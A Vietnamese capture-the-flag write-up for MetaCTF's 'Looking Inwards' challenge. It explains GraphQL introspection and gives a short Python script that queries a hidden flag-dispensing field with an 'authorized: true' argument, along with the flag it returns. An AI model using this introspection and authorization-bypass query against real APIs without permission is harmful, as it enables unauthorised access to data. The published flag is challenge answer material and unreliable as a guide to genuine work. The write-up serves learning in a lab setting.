### Looking Inwards - web challenges

2021-12-08

**Challenge Description:**

```
It's always fun to take a moment of introspection, in this case not about oneself, but about our field (development/security). For example when it comes to API design, first there were SOAP endpoints primarily based on XML. Then as Web 2.0 came along, RESTful APIs became all the rage. Recently, technologies like GraphQL began to gain traction.

With new technologies, though, come new classes of attacks. Check out this basic GraphQL API server. To get you started, here's one cool thing it can do: If you send it a query in the form of echo(message: "message_here"), it will respond with what you said. Can you get it to give you the flag?
```

---

Looking Inwards là một thử thách web khai thác lỗi graphql để có được flag.

**Analyzing**

Ngay khi truy cập vào url tác giả cung cấp đưa chúng ta đến endpoint `/graphl.php` . Đây là endpoit Graphql phổ biến. Khi đã xác định được Graphql endpoint, khai thác đầu tiên có thể làm và hữu ích đó là **introspection**.

> Introspection là khả năng truy vấn tài nguyên nào có sẵn trong lược đồ API hiện tại.  Với API, thông qua introspection, chúng ta có thể thấy các query,  types, fields và derectives mà nó hỗ trợ. 

 Dưới đây là full request để thực hiện Graphql introspection mình thực hiện trong thử thách này:
 ![full_request](https://user-images.githubusercontent.com/68894302/145154919-f44b24ec-da8f-4188-bf18-ffefc67973f0.png)
 
 **Exploit** 

Có khả năng reponse gợi ý rằng query đến trường super_super_secret_flag_dispense để lấy flag.

Sử dụng python để connect với API Graphql,  lý do mình muốn connect GraphQL trực tiếp là bởi vì  có một ứng dụng web mà chúng  ta phải tự điền vào các lĩnh vực từng cái một. Không phải là cách sử  dụng thời gian hiệu quả nhất của tôi nếu chúng ta biết nó lặp đi lặp  lại. Dựa vào description đề bài cho, query của mình sẽ có dạng `echo(message: "message_here")`

```python
import requests, json

query = '''
query{super_super_secret_flag_dispenser(authorized: true)}
'''

url = 'https://metaproblems.com/bb0e56b64e0a17b47450457b07fd2353/graphql.php'
r = requests.post(url,json={'query':query})
print(r.status_code)
print(r.text)
```

Result:

```
└──╼$python3 looking_inwards_poc.py 
200
{"data":{"super_super_secret_flag_dispenser":"MetaCTF{look_deep_and_who_knows_what_you_might_find}"}}
```

